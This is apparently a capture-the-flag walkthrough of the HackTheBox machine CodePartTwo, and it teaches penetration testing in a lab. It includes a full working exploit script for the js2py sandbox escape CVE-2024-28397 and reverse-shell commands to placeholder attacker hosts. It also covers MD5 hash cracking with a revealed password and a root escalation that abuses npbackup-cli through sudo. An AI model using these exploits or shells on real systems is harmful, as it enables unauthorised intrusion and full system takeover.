## Welcome everyone!




Today, we will explore *CodePartTwo*, an easy-level machine from **HackTheBox**.

Without further ado, let’s get started!

![image](/HTB/CodePartTwo/CodePartTwo_images/1.png)

(Please ensure that you have added the following line  `TARGET_IP     codeparttwo.htb` to your local `/etc/hosts` file to enable DNS resolution)





## Information Gathering



First, we will perform an aggressive **Nmap** scan to gather as much information as possible about the target:

![image](/HTB/CodePartTwo/CodePartTwo_images/2.png)

We can identify two exposed services:

**SSH** (OpenSSH 8.2p1 | 22)

**HTTP** (Gunicorn 20.0.4 | 8000)

We can start by inspecting the website hosted on port **8000**:

![image](/HTB/CodePartTwo/CodePartTwo_images/3.png)

The website enables users to edit code and execute it. 
We can use Gobuster to enumerate hidden resources that could help us learn more about the web application deployed:

![image](/HTB/CodePartTwo/CodePartTwo_images/4.png)

We can identify multiple endpoints. The `download` endpoint is interesting, we can start by inspecting it:

![image](/HTB/CodePartTwo/CodePartTwo_images/5.png)

This endpoint allows us to download a compressed file named `app.zip`. We can use `unzip` to extract its content:

![image](/HTB/CodePartTwo/CodePartTwo_images/6.png)

We can assume that the archive contains the application's resources, which can be very useful for us during our enumeration phase. Inspecting the requirements.txt file, we can identify the various libraries used in the application’s `app.py` script:

![image](/HTB/CodePartTwo/CodePartTwo_images/7.png)

We can observe that the application imports the `flask`, `flask-sqlalchemy` and `js2py` libraries. Moreover, we can identify their respective version. We can search for potential vulnerabilities affecting these libraries using `searchsploit`:

![image](/HTB/CodePartTwo/CodePartTwo_images/8.png)

We can identify a Python script which matches the exact version of the `js2py` used by the web application we’re targeting. The script allows us to achieve **remote code execution** (RCE), which allows us to obtain initial access on the target. The vulnerability associated to it is also known as **CVE-2024-28397.**

We will execute it with the `-h` switch to obtain more information about its usage:

![image](/HTB/CodePartTwo/CodePartTwo_images/9.png)

The script seems broken. In addition to commented lines, some quotes are also incorrect.
I recommend to replace the script with the following: 

`"""
Usage:
python3 exploit.py -c "id" > payload.js
python3 exploit.py -c "nc -e /bin/bash 10.10.10.10 4444"
"""`

`import argparse
import sys`

`def generate_payload(command: str) -> str:
"""
Generates the JavaScript payload to escape the sandbox and execute a command.
"""
safe_command = command.replace('"', '\\"')`

```
payload = """
```

`var output = "Initial";`

`try {
// 1. Leak python internals via Object.getOwnPropertyNames
var leaked_wrapper = Object.getOwnPropertyNames({});`

```
// 2. Access base object class
var object_class = leaked_wrapper.__getattribute__("__class__").__base__;

// 3. Recursive search for subprocess.Popen
function find_popen(cls) {
    var subs = cls.__subclasses__();
    for (var i = 0; i < subs.length; i++) {
        var item = subs[i];

        try {
            if (item.__module__ == "subprocess" && item.__name__ == "Popen") {
                return item;
            }
        } catch (e) {}

        if (item.__name__ != "type") {
            try {
                var result = find_popen(item);
                if (result) return result;
            } catch (e) {}
        }
    }
    return null;
}

var Popen = find_popen(object_class);

if (Popen) {
    var res = Popen("COMMAND_PLACEHOLDER", -1, null, -1, -1, -1, null, null, true).communicate();
    output = res;
} else {
    output = "Error: Could not find subprocess.Popen";
}
```

`} catch (e) {
output = "Error during exploit execution: " + e;
}`

`output;
"""`

```
return payload.replace("COMMAND_PLACEHOLDER", safe_command)
```

`def main() -> None:
parser = argparse.ArgumentParser(
description="Payload Generator for CVE-2024-28397 (Js2Py Sandbox Escape)",
formatter_class=argparse.RawDescriptionHelpFormatter
)
parser.add_argument("-c", "--command", default="id",
help="Command to execute on the target")`

```
args = parser.parse_args()

payload = generate_payload(args.command)
print(payload)
```

`if **name** == "**main**":
main()`

We can now use the script correctly:

![image](/HTB/CodePartTwo/CodePartTwo_images/10.png)

The script seems to generate a Javascript payload executed in `js2py` that we need to send it to the target application in order to execute arbitrary commands. It means that we need to find a way to execute some code directly into the web application. As we saw earlier, the web server has a `/dashboard` endpoint. We can attempt to access it to see whether we can execute Python or Javascript code there:

![image](/HTB/CodePartTwo/CodePartTwo_images/11.png)

As expected, we need to be authenticated in order to access it. We can simply create a legitimate account and authenticate:

![image](/HTB/CodePartTwo/CodePartTwo_images/12.png)

Great, we can now edit and execute arbitrary code.






## Initial Access



 Getting back to our exploit, we can run the following command to generate a JavaScript block that we can pass to the web application in order to catch a reverse shell:

`python3 52532.py -c "busybox nc ATTACKER_IP NC_PORT -e sh"`

![image](/HTB/CodePartTwo/CodePartTwo_images/13.png)

We will paste the block into the dashboard’s code editor prompt:

![image](/HTB/CodePartTwo/CodePartTwo_images/14.png)

And we will run it to initiate a connection back to us:

(ensure that you have set up a **netcat listener** in the background via `nc -lvnp PORT`)

![image](/HTB/CodePartTwo/CodePartTwo_images/15.png)

We successfully obtained initial access on the machine as the user **app**!

We can stabilize our shell using the following commands:

`python3 -c 'import pty; pty.spawn("/bin/bash")'` 

`export TERM=xterm`

We can start our local enumeration by checking the `/etc/passwd` file to see whether there are other users present on the system:

![image](/HTB/CodePartTwo/CodePartTwo_images/16.png)

We can identify another non-root user present on the system: **marco**.





## Lateral Movement



Since there is no user flag in our `/home/app` directory, we may need to perform lateral movement to the user **marco**. However, we can identify an interesting database configuration file in the `/home/app/instance` directory:

![image](/HTB/CodePartTwo/CodePartTwo_images/17.png)

Although we obtained a `users.db` file in the `app.zip` we downloaded earlier, it didn’t store what we can observe now: there are two **MD5 hashes**, for the **app** user and **marco**. That’s exactly what we’re looking for! Since MD5 is a weak algorithm, we can paste the hash in a `hash.txt` file and pass it to `hashcat` in order to crack it offline, using the following command:

`hashcat -m 0 -a 0 hash.txt /usr/share/wordlists/rockyou.txt`

![image](/HTB/CodePartTwo/CodePartTwo_images/18.png)

We successfully cracked the hash, revealing the `sweetangelbabylove` cleartext password associated to the user **marco**. We can assume that the password may have been reused for **SSH** access. Let’s attempt to authenticate via SSH using the following credentials:

`marco:sweetangelbabylove`

![image](/HTB/CodePartTwo/CodePartTwo_images/19.png)

It works! We successfully pivoted our access to **marco**, allowing us to retrieve the first flag in the current directory:

![image](/HTB/CodePartTwo/CodePartTwo_images/20.png)





## Privilege Escalation



We now need to escalate our current privileges to **root** in order to retrieve the final flag. There is an interesting `backups` folder in our /home/marco directory, but we don’t have the permissions to access it. We can start our privilege escalation vectors enumeration by running `sudo -l` to see whether we are able to run any command with **root privileges** on the system:

![image](/HTB/CodePartTwo/CodePartTwo_images/21.png)

It appears that we can run the `npbackup-cli` command as **root** without providing a password. We can observe in the `/home/marco/npbackup.conf` file that the backup path is defined to `/home/app/app`.

Reviewing the help menu of the binary revealed an interesting option: `--external-backend-binary`.

This option allows the user to specify a custom external binary that will be used by the backup process. Since the binary is executed by **npbackup-cli**, and the tool itself runs with **root privileges**, any external binary passed to this option will also be executed as **root**.

Critically, there is **no validation or restriction** on the path of the binary provided. This means we can supply our own malicious script and have it executed with full root privileges.

We can abuse the `--external-backend-binary` option to execute a custom binary instead of the default backend with the following command:

`sudo /usr/local/bin/npbackup-cli --config /home/marco/npbackup.conf --external-backend-binary=/PATH/TO/FILE --backup --repo-name default`

If we include a malicious file, it will be treated and executed with root privileges. We can run the following command in the `/home/marco` directory to inject code that will initiate a reverse shell through a malicious script that will be executed as **root**:

`cat > /home/marco/malicious.sh << 'EOF'
#!/bin/bash`

`bash -i >& /dev/tcp/ATTACKER_IP/NC_PORT 0>&1
EOF`

(ensure that you replace the IP and port value accordingly to your case)

We will then give it execute permissions:

![image](/HTB/CodePartTwo/CodePartTwo_images/22.png)

Finally we can run the following command to trigger the script and receive a **root shell**:

`sudo /usr/local/bin/npbackup-cli --config /home/marco/npbackup.conf --external-backend-binary=/home/marco/malicious.sh --backup --repo-name default`

(ensure that you have set up your **netcat listener** and configured it respectively to your script)

![image](/HTB/CodePartTwo/CodePartTwo_images/23.png)

We successfully escalated our privileges to **root**, granting full system access and control! We can now navigate to the `/root` directory and retrieve the final flag:

![image](/HTB/CodePartTwo/CodePartTwo_images/24.png)

Challenge completed!

![image](/HTB/CodePartTwo/CodePartTwo_images/25.png)

## Conclusion

This challenge was very pleasant to complete. We started with a basic enumeration which led us to download the application resources archive and extract its content. From there, we identified a vulnerable Python library that allowed us to escape the sandbox environment and execute arbitrary commands on the remote system, granting us initial access as the **app** user. We then found a database configuration file which was storing **password hashes** of the system users. We then pivoted our access to **marco**, a user that was able to run `npbackup-cli` with **root privileges** via `sudo`. We leveraged this sudo misconfiguration by including **external binaries** to the script via the `--external-backend-binary` option, which allowed us to load malicious script with root permissions, granting us a **root Bash shell**, and full system access and control.

**Thank you for reading!**
